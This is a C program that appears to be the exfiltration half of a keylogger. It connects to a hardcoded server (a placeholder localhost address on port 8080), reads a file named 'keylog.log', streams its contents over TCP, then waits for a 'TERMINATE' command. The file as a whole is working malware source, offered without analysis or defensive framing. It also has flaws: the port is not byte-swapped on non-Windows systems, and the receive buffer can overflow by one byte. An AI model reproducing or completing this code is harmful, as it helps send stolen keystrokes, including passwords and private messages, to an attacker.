#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#ifdef _WIN32
#include <winsock2.h>
typedef int socklen_t; // Define a custom type for socklen_t
#else
#include <arpa/inet.h>
#include <sys/socket.h>
#endif

#define SIZE 1024
#define DEFAULT_PORT 8080
#define IP "127.0.0.1"

void send_file(FILE *file, int sockfd)
{
    char data[SIZE] = {};
    size_t n;

    while ((n = fread(data, 1, sizeof(data) - 1, file)) > 0)
    {
        if (send(sockfd, data, n, 0) == -1)
        {
            perror("[-] Error in sending data");
            exit(1);
        }
        memset(data, 0, SIZE);
    }
}

void terminate_connection(int sockfd)
{
    char buffer[256];
    int read_size;

    while (1)
    {
        read_size = recv(sockfd, buffer, 256, 0);
        if (read_size > 0)
        {
            buffer[read_size] = '\0';
            if (strcmp(buffer, "TERMINATE") == 0)
            {
                printf("[+] Terminating connection: received TERMINATE message.\n");
#ifdef _WIN32
                closesocket(sockfd);
                WSACleanup();
#else
                close(sockfd);
#endif
                exit(EXIT_SUCCESS);
            }
        }
        else if (read_size == 0 || read_size == -1)
        {
            break;
        }
    }

    printf("Terminating connection: socket closed.\n");
    printf("[+] Disconnected from the server. \n");
#ifdef _WIN32
    closesocket(sockfd);
    WSACleanup();
#else
    close(sockfd);
#endif
    exit(EXIT_SUCCESS);
}

int main()
{
#ifdef _WIN32
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
    {
        printf("[-] Error in WSAStartup: %d\n", WSAGetLastError());
        exit(1);
    }
#endif

    int sockfd;
    struct sockaddr_in server_addr;
    FILE *file;
    char filename[] = "keylog.log";

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        perror("[-] Error in socket");
        exit(1);
    }
    printf("[+] Server socket created. \n");

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = DEFAULT_PORT;
    server_addr.sin_addr.s_addr = inet_addr(IP);
#ifdef _WIN32
    server_addr.sin_port = htons(DEFAULT_PORT);
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
    {
        printf("[-] Error in Connecting: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        exit(1);
    }
#else
    int e;
    e = connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if(e == -1)
    {
        perror("[-]Error in Connecting");
        exit(1);
    }
#endif

    printf("[+] Connected to server.\n");

    file = fopen(filename, "r");
    if (!file)
    {
        perror("[-] Error in reading file.");
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        exit(1);
    }
    send_file(file, sockfd);
    printf("[+] File data sent successfully. \n");
    terminate_connection(sockfd);
}
